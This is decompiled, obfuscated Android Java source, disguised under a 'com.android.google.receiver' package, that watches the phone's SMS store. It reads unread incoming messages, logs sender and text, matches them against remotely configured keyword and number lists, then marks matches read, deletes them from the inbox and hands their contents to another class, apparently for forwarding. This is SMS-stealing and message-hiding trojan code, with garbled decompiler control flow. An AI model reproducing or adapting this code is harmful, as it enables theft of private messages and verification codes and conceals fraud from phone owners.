package com.android.google.receiver;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.text.TextUtils;
import com.android.a.a.c;

public final class a
  extends ContentObserver
{
  public static String[] a;
  public static String[] b;
  private static a d = null;
  private Context c;
  private boolean e = false;
  
  private a(Handler paramHandler, Context paramContext)
  {
    super(paramHandler);
    this.c = paramContext;
    this.e = false;
  }
  
  private int a(String paramString)
  {
    paramString = "address='" + paramString + "'";
    ContentValues localContentValues = new ContentValues();
    localContentValues.put("read", Integer.valueOf(1));
    return this.c.getContentResolver().update(Uri.parse("content://sms"), localContentValues, paramString, null);
  }
  
  public static a a(Handler paramHandler, Context paramContext)
  {
    if (d == null)
    {
      d = new a(paramHandler, paramContext);
      paramContext.getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, d);
    }
    return d;
  }
  
  private void a(Context paramContext)
  {
    try
    {
      paramContext = paramContext.getApplicationContext().getContentResolver().query(Uri.parse("content://sms"), null, "type = 1 and read = 0", null, null);
      paramContext.moveToFirst();
      boolean bool;
      do
      {
        String str1 = paramContext.getString(paramContext.getColumnIndex("address"));
        String str2 = paramContext.getString(paramContext.getColumnIndex("body"));
        paramContext.getString(paramContext.getColumnIndex("_id"));
        com.android.f.a.a.a("tag", "st = " + str1);
        com.android.f.a.a.a("tag", "body = " + str2);
        a(str1, str2);
        bool = paramContext.moveToNext();
      } while (bool);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  private void a(String paramString1, String paramString2)
  {
    String[] arrayOfString1;
    String[] arrayOfString2;
    int i;
    if ((!TextUtils.isEmpty(c.o(this.c))) && (!TextUtils.isEmpty(c.p(this.c))))
    {
      arrayOfString1 = c.p(this.c).split("\\|");
      arrayOfString2 = c.o(this.c).split("\\|");
      if ((arrayOfString2.length > 0) && (arrayOfString1.length > 0))
      {
        i = 0;
        if (i < arrayOfString1.length) {
          break label105;
        }
      }
    }
    label105:
    int j;
    if ((b != null) && (a != null))
    {
      com.android.f.a.a.a("tag", "--111111111= ");
      i = 0;
      if (i < b.length) {}
    }
    else
    {
      return;
      if ((!TextUtils.isEmpty(arrayOfString1[i])) && (paramString2.contains(arrayOfString1[i]))) {
        j = 0;
      }
      for (;;)
      {
        if (j >= arrayOfString2.length)
        {
          i += 1;
          break;
        }
        if ((!TextUtils.isEmpty(arrayOfString2[j])) && (paramString1.contains(arrayOfString2[j])))
        {
          a(paramString1);
          b(paramString1);
          return;
        }
        j += 1;
      }
    }
    if ((!TextUtils.isEmpty(b[i])) && (paramString1.contains(b[i]))) {
      j = 0;
    }
    for (;;)
    {
      if (j >= a.length)
      {
        i += 1;
        break;
      }
      if ((!TextUtils.isEmpty(a[j])) && (paramString2.contains(a[j])))
      {
        if (!this.e)
        {
          this.e = true;
          com.android.f.a.a.a("tag", "--fff2--pHoneNum = " + paramString1 + " body = " + paramString2);
          b.a(paramString1, paramString2, this.c);
        }
        a(paramString1);
        b(paramString1);
      }
      j += 1;
    }
  }
  
  private int b(String paramString)
  {
    paramString = "address='" + paramString + "'";
    return this.c.getContentResolver().delete(Uri.parse("content://sms"), paramString, null);
  }
  
  public final void onChange(boolean paramBoolean)
  {
    super.onChange(paramBoolean);
    if (!TextUtils.isEmpty(c.e(this.c))) {
      a = c.e(this.c).split("\\|");
    }
    if (!TextUtils.isEmpty(c.f(this.c))) {
      b = c.f(this.c).split("\\|");
    }
    this.e = false;
    a(this.c);
  }
}
